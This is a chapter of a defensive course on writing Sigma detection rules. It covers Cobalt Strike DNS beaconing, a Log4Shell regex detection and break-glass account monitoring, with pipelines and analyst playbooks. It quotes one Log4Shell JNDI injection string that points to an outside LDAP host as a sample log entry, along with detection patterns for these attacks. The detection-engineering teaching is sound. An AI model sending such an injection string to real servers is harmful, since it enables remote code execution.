# 4.3 :: Writing Our Own Sigma Rules

Up until now we've been relying on the Sigma rules written by others to support our Detection Engineering efforts. This is normal and how everyone does and should start with their detection engineering program. The community rules are good, well maintained, and are supported by the breadth of knowledge of many security practitioners. 

There will come a time though when public rules are not quite enough. This may be because of a specific targeted attack that you've seen in your environment that you want to detect elsewhere or it may be because of specific assets in your environment that you want to protect. A common scenario is that you've identified a specific vulnerability on a machine that you cannot patch. In order to mitigate the risk of allowing this vulnerability to persist in your environment you may choose to write a detection that will pinpoint the log entry that results from the exploitation of said vulnerability. Another common scenario is that you may have a break-glass domain admin account that should never be used and you want a detection to be raised when that glass has been broken.

## Detection Logic: An Aside on True Positive, False Positive, True Negative, and False Negative

This is a contentious topic in security circles. Intuitively the word "false positive" gets assigned to any event that generated a detection but isn't malicious. This is not quite how that should work and as a detection engineer we need to be clear on the definition of this word.

A false positive identifies an instance in which a test or detection incorrectly indicates the presence of a condition. In the terms of threat detection we are stating a hypothesis with a rule and then writing a bit of detection logic to identify the behavior associated with that hypothesis. A false positive is when your hypothesis is incorrect and the behavior identified is not fitting to your assumptions.

A false negative is the opposite where a test or detection incorrectly indicates the absence of a condition. In the terms of threat detection you often need to filter out false positives out of your searches, but you must do so carefully. A filter that is too broad can then filter out true positive events accidentally and thus creating a false negative scenario. More on this in a bit.

A true positive scenario is the ideal state for your detections (and the non-ideal state for your incident response team). This is where your detection is working exactly as expected and has identified malicious behavior.

A true negative is when you've asserted that a condition is not present and it is in fact not present. This is very hard to prove in detection engineering and you really should just avoid it. You can say things like "When I executed this well tested and tuned search in our environment, it did not find any results of this specific attack pattern" and that could be a true negative. You cannot say things like "I have a Sigma rule that identifies attacks related to MITRE ATT&CK t1570 and thus there is no instances of lateral tool transfer in our environment" because that is now very likely setting you up for false negative scenarios. You cannot definitively say that a single detection or even a group of detections will detect every possible procedure that attackers may use for a single tactic.

Take the following rule:

```yaml
title: Cobalt Strike DNS Beaconing
id: 2975af79-28c4-4d2f-a951-9095f229df29
status: test
description: Detects suspicious DNS queries known from Cobalt Strike beacons
references:
    - https://www.icebrg.io/blog/footprints-of-fin7-tracking-actor-patterns
    - https://www.sekoia.io/en/hunting-and-detecting-cobalt-strike/
author: Florian Roth (Nextron Systems)
date: 2018-05-10
modified: 2022-10-09
tags:
    - attack.command-and-control
    - attack.t1071.004
logsource:
    category: dns
detection:
    selection1:
        query|startswith:
            - 'aaa.stage.'
            - 'post.1'
    selection2:
        query|contains: '.stage.123456.'
    condition: 1 of selection*
falsepositives:
    - Unknown
level: critical
```

The hypothesis may be that queries that start with either `aaa.stage.` or `post.1` or contain `.stage.123456.` are suspicious DNS queries associated with Cobalt Strike beacons.

Let's imagine a few results that you find in your logs when you execute this search:

`aaa.stage.confluence-test.contoso.com`
`a2n2n211.stage.123456.contoso.com`

During your investigation of these indicators you find that your software engineers were testing Confluence deployments and named their staging instance `aaa.stage`. This is a classic false positive scenario. Your detection asserted that `aaa.stage` is used in Cobalt Strike beacons but when you've investigated this indicator deeper you have no evidence of Cobalt Strike.

In the 2nd indicator you did in fact find a Cobalt Strike beacon during your investigation. This is a true positive scenario.

Now that you've seen a false positive you should tune your rule to remove that indicator from future searches, but here is where we need to be careful. When you tune out a indicator you need to be sure that you are being as specific as possible. Consider the following bad tuning:

```yaml
detection:
    selection1:
        query|startswith:
            - 'aaa.stage.'
            - 'post.1'
    selection2:
        query|contains: '.stage.123456.'
    filter1:
        query|endswith: 'contoso.com'
    condition: 1 of selection* and not filter1
```

Now the hypothesis of this rule has changed. It states that Cobalt Strike beacons can be found with DNS queries that start with `aaa.stage.` or `post.1` or contain `.stage.123456.` but never end with `contoso.com`. Based on the investigations that we performed earlier, we know that this is not a valid hypothesis. This is creating a false negative scenario where we are saying "we are safe from this specific cobalt strike procedure" but we are in fact not. 

Before moving forward consider how you would write that filter to be more specific and avoid a false negative scenario.

## Detection Writing: But How?

![](https://github.com/The-Taggart-Institute/detection-with-sigma/blob/main/Images/de_lifecycle.png)

We all develop our own methodology for writing detection rules. I will show you my method but and I look forward to hearing about yours. 

I start with an ideation phase where I think about what I want to write in a rule. Sometimes I will take inspiration from the news or a threat intel report, other times I will execute malware in my lab and watch it work. 

Once I've got an idea for a rule, the next critical step is to generate or find a log event that illustrates my detection hypothesis. 

From here I will begin to work in the opposite direction of what we use the pipelines for up until this point and take that log entry I found, pick out the unique fields that capture the malicious behavior, and replace them with the generalized fields used by the Sigma community. During this stage I also try to build the logic of my detection where I define the keywords that I am looking for and the elements I'd like to filter out all while avoiding the trappings of the true positive and false negative scenarios. 

With a Sigma rule in hand, it is time to convert it back to SPL. This may seem backwards, but remember the advantage of using Sigma rules in the first place. With the generic rule that we have written, we can share this rule with the community at large. We can also ensure that if we change our SIEM sometime in the future, we only need to change our pipeline and all of our rules will still just work. With this rule converted to SPL I will begin testing it against my data. In a production environment where I have a lot of data to play with, I will typically run this search against a long period of time and see what kind of events come up. If you run this rule against a full year of log data and do not have any events, you need to consider if your detection logic is sound. Are you sure you're looking for what you think you should be? Try again to trigger the detection by performing the attack you're hoping to identify. Alternatively you may find way too many events from this rule and you may need to do additional tuning to remove false positive events. This phase is typically the longest phase of the detection engineering lifecycle.

Once you are confident with the quality of your rule, you should write a playbook of how to respond once this rule triggers. As the author of the rule and the person who has spent the time researching this particular attack, there are few others who are more equipped to respond to this incident than you. Take the knowledge that you've developed to publish this rule and write up some steps on how to analyze and respond to an event. What does a true positive event look like? What might an attacker do next once they've successfully accomplished this single win? Where did this attack originate from and where might an analyst look for initial access? Even just having 4-5 steps that an analyst should consider while working this detection will provide immense value.

Finally you are ready to push to production! Your rule has been tested and validated and it is time to see what kind of attacks you can catch.

## Some Examples

### Unpatched Vulnerability

As much as we wish that everything could be patched to the latest secure version, the nature of reality is that we will need to accept risky systems in our environments. Let's imagine an example where there is a production server in your enterprise that is susceptible to the Log4Shell exploit and the maintainers of that server will not or cannot patch it. After you're done prying your palm off of your forehead, we can build a detection for this specific scenario.

The ideation phase is already done because we know the rule that we'd like to develop. There is a server that is vulnerable to CVE-2021-44228 and CVE-2021-45046.

Next we need to generate or find a log event. We can start with some basic threat hunting (searching for the keyword `jndi` is a good start) or we can jump straight to using a tool that will generate this event in our logs like Tennable or Qualys. For the sake of this example, let's assume that the string we found in our logs is `${jndi:ldap://10.10.10.1:1099/obj}`. 

Because this is a well researched topic we can find some detection logic online. One thing to know about Log4J is that it is very commonly obfuscated. While there is a clear pattern that is required to execute the attack, there are a number of ways to format the `jndi` string to achieve the goal of the attacker. In your research you found the following regex: https://github.com/back2root/log4shell-rex and we can now push this into a Sigma rule. (Please do not spend too much time breaking down this regex. It is complicated and if you're interested it is documented in that repo. But that is not the point of this exercise!) 

```yaml
title: Log4J Exploitation Discovery Via Regex
id: 3e814be2-b7c2-4a2e-bda1-628617ef5678
status: test
description: Detects Log4J and obfuscated Log4J attacks using a complex regex
references:
    - https://github.com/back2root/log4shell-rex
author: back2root, Josh Nickels
date: 2024-05-19
tags:
    - attack.initial-access
    - attack.t1190
logsource:
    category: webserver
detection:
    selection:
        keywords|re: '(?im)(?:^|[\n]).*?(?:[\x24]|%(?:25%?)*24|\\u?0*(?:44|24))(?:[\x7b]|%(?:25%?)*7b|\\u?0*(?:7b|173))[^\n]*?((?:j|%(?:25%?)*(?:4a|6a)|\\u?0*(?:112|6a|4a|152))[^\n]*?(?:n|%(?:25%?)*(?:4e|6e)|\\u?0*(?:4e|156|116|6e))[^\n]*?(?:d|%(?:25%?)*(?:44|64)|\\u?0*(?:44|144|104|64))[^\n]*?(?:[i\\x{130}\\x{131}]|%(?:25%?)*(?:49|69|C4%(?:25%?)*B0|C4%(?:25%?)*B1)|\\u?0*(?:111|69|49|151|130|460|131|461))[^\n]*?(?:[\x3a]|%(?:25%?)*3a|\\u?0*(?:72|3a))[^\n]*?((?:l|%(?:25%?)*(?:4c|6c)|\\u?0*(?:154|114|6c|4c))[^\n]*?(?:d|%(?:25%?)*(?:44|64)|\\u?0*(?:44|144|104|64))[^\n]*?(?:a|%(?:25%?)*(?:41|61)|\\u?0*(?:101|61|41|141))[^\n]*?(?:p|%(?:25%?)*(?:50|70)|\\u?0*(?:70|50|160|120))(?:[^\n]*?(?:[s\\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\u?0*(?:17f|123|577|73|53|163)))?|(?:r|%(?:25%?)*(?:52|72)|\\u?0*(?:122|72|52|162))[^\n]*?(?:m|%(?:25%?)*(?:4d|6d)|\\u?0*(?:4d|155|115|6d))[^\n]*?(?:[i\\x{130}\\x{131}]|%(?:25%?)*(?:49|69|C4%(?:25%?)*B0|C4%(?:25%?)*B1)|\\u?0*(?:111|69|49|151|130|460|131|461))|(?:d|%(?:25%?)*(?:44|64)|\\u?0*(?:44|144|104|64))[^\n]*?(?:n|%(?:25%?)*(?:4e|6e)|\\u?0*(?:4e|156|116|6e))[^\n]*?(?:[s\\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\u?0*(?:17f|123|577|73|53|163))|(?:n|%(?:25%?)*(?:4e|6e)|\\u?0*(?:4e|156|116|6e))[^\n]*?(?:[i\\x{130}\\x{131}]|%(?:25%?)*(?:49|69|C4%(?:25%?)*B0|C4%(?:25%?)*B1)|\\u?0*(?:111|69|49|151|130|460|131|461))[^\n]*?(?:[s\\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\u?0*(?:17f|123|577|73|53|163))|(?:[^\n]*?(?:[i\\x{130}\\x{131}]|%(?:25%?)*(?:49|69|C4%(?:25%?)*B0|C4%(?:25%?)*B1)|\\u?0*(?:111|69|49|151|130|460|131|461))){2}[^\n]*?(?:o|%(?:25%?)*(?:4f|6f)|\\u?0*(?:6f|4f|157|117))[^\n]*?(?:p|%(?:25%?)*(?:50|70)|\\u?0*(?:70|50|160|120))|(?:c|%(?:25%?)*(?:43|63)|\\u?0*(?:143|103|63|43))[^\n]*?(?:o|%(?:25%?)*(?:4f|6f)|\\u?0*(?:6f|4f|157|117))[^\n]*?(?:r|%(?:25%?)*(?:52|72)|\\u?0*(?:122|72|52|162))[^\n]*?(?:b|%(?:25%?)*(?:42|62)|\\u?0*(?:102|62|42|142))[^\n]*?(?:a|%(?:25%?)*(?:41|61)|\\u?0*(?:101|61|41|141))|(?:n|%(?:25%?)*(?:4e|6e)|\\u?0*(?:4e|156|116|6e))[^\n]*?(?:d|%(?:25%?)*(?:44|64)|\\u?0*(?:44|144|104|64))[^\n]*?(?:[s\\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\u?0*(?:17f|123|577|73|53|163))|(?:h|%(?:25%?)*(?:48|68)|\\u?0*(?:110|68|48|150))(?:[^\n]*?(?:t|%(?:25%?)*(?:54|74)|\\u?0*(?:124|74|54|164))){2}[^\n]*?(?:p|%(?:25%?)*(?:50|70)|\\u?0*(?:70|50|160|120))(?:[^\n]*?(?:[s\\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\u?0*(?:17f|123|577|73|53|163)))?)[^\n]*?(?:[\x3a]|%(?:25%?)*3a|\\u?0*(?:72|3a))|(?:b|%(?:25%?)*(?:42|62)|\\u?0*(?:102|62|42|142))[^\n]*?(?:a|%(?:25%?)*(?:41|61)|\\u?0*(?:101|61|41|141))[^\n]*?(?:[s\\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\u?0*(?:17f|123|577|73|53|163))[^\n]*?(?:e|%(?:25%?)*(?:45|65)|\\u?0*(?:45|145|105|65))[^\n]*?(?:[\x3a]|%(?:25%?)*3a|\\u?0*(?:72|3a))(JH[s-v]|[\x2b\x2f-9A-Za-z][CSiy]R7|[\x2b\x2f-9A-Za-z]{2}[048AEIMQUYcgkosw]ke[\x2b\x2f-9w-z]))'
    condition: selection
falsepositives:
    - Vulnerability scanners
level: high
```

Before we move on, we need to make sure that our pipeline handles this properly. We need the regex to be applied to the `_raw` field and so we need to map `keywords` to `_raw`. 

Use the following pipeline:

```yaml
name: webserver
priority: 10
transformations:
  - id: webserver_index
    type: add_condition
    conditions:
        index: webserver
    rule_conditions:
        - type: logsource
          category: webserver
  - id: mapping
    type: field_name_mapping
    mapping:
        keywords: _raw
    rule_conditions:
        - type: logsource
          category: webserver
```

Now it is time for testing. In cases like this we kind of hope that we don't find anything in the logs outside of our intentionally triggered events from a vulnerability scanner, but we need to be sure our detection logic works. The repo linked above also happens to have some useful test data that we can import into a lookup list and search against as well if we're unable to find anything in our logs.

How should an analyst respond to this detection? In the case of the log4j attack we know that an attack came in from an unexpected source and attempted to get remote code execution on our vulnerable host. We can use the CEJ method for threat analysis by asking these two questions:

1. Where did you come from?
2. Where did you go?

So an analyst may want to investigate the following things:
- What is the host that the attacker used to initiate the attack? Is it inside the network or a known host?
- Should that host be attempting this attack (is it a vulnerability scanner)?
- What commands did the attacker execute after getting remote code execution on this host?
- What could an attacker do once they have access to this host?

With a working detection in hand, some evidence or detection logic validity, and a response playbook. You are now ready to push this rule to production.


### Break-Glass Account

If you are familiar with Systems Administration you may have heard of the concept of a "break-glass account". The name stems from the fire alarms you may see in public places with the words "In case of an emergency, break the glass and pull the alarm". A "break-glass account" is typically a high privileged account that should only be used if your administrators are not able to access their accounts. The nature of this account is that it should only be used in an emergency and so we should use our detections to verify that this is actually only happening in the case of an emergency.

Our ideation phase is done. Our hypothesis is that "attackers may use this break glass account as a target for privilege escalation".

There are a few ways we can approach this rule but for the sake of simplicity I want to find just any instance of this account being captured in our log events. We likely have at least some logs of this account's usage when it was first set up and can likely build a SPL query to be something like: `index=winevent User=SuperAdmin-BG`.

Next we build a detection rule. While we could just directly call out the name of our breakglass account in the rule, I think this is a perfect opportunity to use a placeholder!

Let's use the following Sigma rule:

```yaml
title: Break-Glass Admin Account Usage
id: d6874582-6101-4f53-9cf3-ff0854d97e1c
status: test
description: Detects any usage of a Break-Glass admin account as defined by the placeholder
references:
    - https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/security-emergency-access
author: Josh Nickels
date: 2024-05-19
tags:
    - attack.privilege-escalation
    - attack.t1078.002
logsource:
    product: windows
detection:
    selection:
        User|expand: '%breakglass_admins%'
    condition: selection
falsepositives:
    - Unknown
level: high
```

and the following pipeline:

```yaml
name: value_placeholder_pipeline
priority: 10
vars:
    breakglass_admins:
        - 'SuperAdmin-BG'
transformations:
    - id: bg_placeholder
      type: value_placeholders
      include:
          - 'breakglass_admins'
    - id: webserver_index
      type: add_condition
      conditions:
          index: winevent
      rule_conditions:
          - type: logsource
            product: windows
```

Great! This converts and is scalable. We can share this rule with our peers and not have to worry about them knowing the private names of our break glass accounts!

Now we can perform some testing. Let's run this search against as much log data as we can. Are there any log entries that do not represent a potential attack? If so think about ways that you can tune them out with a modification to this Sigma rule.

An analyst could investigate this detection pretty simply too, the first thing they need to do is call the Sysadmin responsible for this account and ask if it was them. If the answer is "no" then you've likely got an incident on your hands. The analyst needs to next identify how the attacker got access to this account, what they did once they obtained access, and where else this attacker has been in your environment. This is likely a "everyone stops what they are doing and jumps in to help" scenario.

Finally we can push this to production.

## Check for Understanding

Now I think you are ready to write your own Sigma rule. To do this, you will read a report about an attack and pick out single detectable atomics and write a Sigma rule that will identify this behavior. 

If you have not heard of the DFIR Report, you are in for a treat. Take a look at [this ransomware report](https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/) and find at least one single action taken by the attackers and write a Sigma rule. DFIR Report will link to detections associated with this attack and you are welcome to use those as references for building your own, but I ask that you keep your work as unique to you as possible. There is no grade, this is just for your learning.

Once you've got that rule ready, publish it in your github repo and push it to your Splunk host. Run the search and see if you have evidence of this attack technique in your logs. Be prepared to add filters to your detection logic to remove non-malicious behavior.

Finally, for extra credit, perform the attack on a host that is shipping logs to your Splunk instance (sorry, setting that up is out of scope of this course) and verify that this detection catches it. If you've done this, you can officially put "purple teamer" on your resume.

